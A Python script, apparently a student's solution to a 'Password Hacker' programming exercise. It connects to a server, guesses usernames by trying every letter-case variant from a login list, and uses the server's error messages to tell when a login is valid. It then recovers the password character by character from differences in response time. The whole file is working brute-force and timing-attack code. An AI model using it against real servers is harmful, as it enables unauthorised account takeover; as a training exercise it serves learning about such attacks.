import datetime
import itertools
import json
import socket
import sys
import string

args = sys.argv
host, port = args[1], args[2]


def get_username(sock):
    with open("/home/jyoti/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt", "r") as file:
        for line in file.readlines():
            msg = line.strip().lower()
            no_case = len(list(filter(lambda c: c not in string.digits, msg)))
            for comb in itertools.product((True, False), repeat=no_case):
                conv_msg = ""
                i = 0
                for c in msg:
                    if c in string.digits:
                        conv_msg += c
                    else:
                        conv_msg += c.upper() if comb[i] else c.lower()
                        i += 1

                content = {
                    "login": conv_msg,
                    "password": ""
                }

                sock.send(json.dumps(content).encode())
                res = json.loads(sock.recv(1024).decode())
                if res["result"] in ['Wrong password!', 'Exception happened during login']:
                    return conv_msg


def get_password(sock, username):
    password = ""
    while True:
        times = {}
        for char in string.ascii_letters + string.digits:

            msg = password + char

            content = {
                "login": username,
                "password": msg
            }
            sock.send(json.dumps(content).encode())
            start = datetime.datetime.now()
            res = json.loads(sock.recv(1024).decode())
            end = datetime.datetime.now()

            if res["result"] == "Connection success!":
                password += char
                return password
            else:
                times[end - start] = password + char

        password = times[max(times.keys())]


def check():
    with socket.socket() as sock:
        sock.connect((host, int(port)))

        username = get_username(sock)
        password = get_password(sock, username)

        result = {"login": username, "password": password}
        print(json.dumps(result))


check()
